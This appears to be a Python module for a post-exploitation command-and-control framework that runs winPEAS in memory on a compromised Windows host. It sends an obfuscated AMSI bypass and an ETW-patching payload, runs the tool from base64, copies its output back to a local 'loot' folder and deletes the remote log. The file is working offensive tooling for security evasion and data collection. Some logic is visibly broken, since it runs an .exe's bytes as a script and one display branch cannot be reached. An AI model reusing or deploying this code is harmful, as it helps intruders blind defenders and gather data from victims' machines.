import base64
from core.module_base import ModuleBase
from core import session_manager, shell
from colorama import Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

class Module(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "inmemory_winpeas"
        self.description = "Bypass AMSI & ETW, run winPEAS in-memory, capture real-time output"
        self.options = {
            "session": {
                "description": "Target session ID or alias",
                "required": True,
                "value": ""
            },
            "winpeas_path": {
                "description": "Path to winPEASany.exe",
                "required": True,
                "value": "loot/winPEASany.exe"
            }
        }

    def run(self):
        sid = session_manager.resolve_sid(self.options["session"]["value"])
        if not sid or sid not in session_manager.sessions:
            print(brightred + "[!] Invalid session")
            return

        session = session_manager.sessions[sid]
        os_type = session.metadata.get("os", "").lower()
        if "windows" not in os_type:
            print(brightred + "[!] This module only runs on Windows targets")
            return

        winpeas_path = self.options["winpeas_path"]["value"]
        try:
            with open(winpeas_path, "rb") as f:
                b64_peas = base64.b64encode(f.read()).decode()
        except Exception as e:
            print(brightred + f"[!] Failed to read winPEAS: {e}")
            return

        print(brightyellow + "[*] Sending AMSI + ETW bypass...")

        amsi = "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));$n='Non'+'Public';$s='Static';$f=$e.GetField(([string]::Join('',[char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);$t=[type[]]@([object],[bool]);$m=$f.GetType().GetMethod('Set'+'Value',$t);$m.Invoke($f,@($null,$true))"

        etw = "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);$etblOff=$ntbase.ToInt64()+$pe+0x88;$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);$exptVA=$ntbase.ToInt64()+$expt;$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;$etwptr=0;for($i=0;$i-lt$fnCount;$i++){$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));$namePtr=($ntbase.ToInt64()+$nameRVA);$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};if($currName-eq$e){$etwptr=$namePtr;break}};$etwAddr=[IntPtr]$etwptr;$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

        if session_manager.is_tcp_session(sid):
            shell.run_quiet_tcpcmd(sid, amsi, timeout=0.5)
            shell.run_quiet_tcpcmd(sid, etw, timeout=0.5)
            print(brightgreen + "[+] AMSI and ETW bypassed.")

            print(brightyellow + "[*] Running winPEAS in-memory and saving output to file...")

            remote_log = "C:\\Windows\\Temp\\wp_check.txt"
            ps = (
                f"$code=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"{b64_peas}\"));"
                "$sb=[ScriptBlock]::Create($code);"
                f"& $sb | Out-String | Out-File -FilePath \"{remote_log}\" -Encoding ASCII"
            )

            shell.run_quiet_tcpcmd(sid, ps, timeout=10)
            print(brightyellow + "[*] Downloading output...")
            local_outfile = f"./loot/{sid}_winpeas.txt"
            shell.download_file_tcp(sid, remote_log, local_outfile)

            clean_log = f"del {remote_log}"
            shell.run_quiet_tcpcmd(sid, clean_log, timeout=0.5)
            output_display = 0

            while True:
                try:
                    output = input(brightyellow + f"[*] Would you like to display the winpeas results to the screen y/N? ")

                    if output in ("y", "Y", "yes", "Yes", "yess", "Yess"):
                        output_display = 1
                        break

                    elif output in ("n", "N", "no", "No", "noo", "Noo"):
                        output_display = 0
                        break

                    else:
                        print(brightred + f"[-] ERROR you picked an invalid option!")

                except Exception as e:
                    print(brightred + f"[-] ERROR failed to capture input from user: {e}")

                if output_display == 1:
                    print(brightgreen + f"[+] winPEAS output saved to {local_outfile}")
                    print(brightblue + "\n=== winPEAS Output ===\n")
                    with open(local_outfile, "r") as f:
                        file = f.read()

                    print(file)

                elif output_display == 0:
                    pass

                else:
                    print(brightred + f"[-] ERROR an unknown error has ocurred!")

        elif session_manager.sessions[sid].transport in ("http", "https"):
            shell.run_command_http(sid, amsi)
            shell.run_command_http(sid, etw)
            print(brightgreen + "[+] AMSI and ETW bypassed.")

            print(brightyellow + "[*] Running winPEAS in-memory and saving output to file...")

            remote_log = "C:\\Windows\\Temp\\wp_check.txt"
            ps = (
                f"$code=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\"{b64_peas}\"));"
                "$sb=[ScriptBlock]::Create($code);"
                f"& $sb | Out-String | Out-File -FilePath \"{remote_log}\" -Encoding ASCII"
            )


            shell.run_command_http(sid, ps)
            print(brightyellow + "[*] Downloading output...")

            local_outfile = f"./loot/{sid}_winpeas.txt"
            shell.download_file_http(sid, remote_log, local_outfile)
            print(brightgreen + f"[+] Downloaded winpeas output to {local_outfile}")

            clean_log = f"del {remote_log}"
            shell.run_command_http(sid, clean_log)
            output_display = 0

            while True:
                try:
                    output = input(brightyellow + f"[*] Would you like to display the winpeas results to the screen y/N? ")

                    if output in ("y", "Y", "yes", "Yes", "yess", "Yess"):
                        output_display = 1
                        break

                    elif output in ("n", "N", "no", "No", "noo", "Noo"):
                        output_display = 0
                        break

                    else:
                        print(brightred + f"[-] ERROR you picked an invalid option!")

                except Exception as e:
                    print(brightred + f"[-] ERROR failed to capture input from user: {e}")

            if output_display == 1:
                print(brightgreen + f"[+] winPEAS output saved to {local_outfile}")
                print(brightblue + "\n=== winPEAS Output ===\n")
                with open(local_outfile, "r") as f:
                    file = f.read()

                print(file)

            elif output_display == 0:
                pass

            else:
                print(brightred + f"[-] ERROR an unknown error has ocurred!")



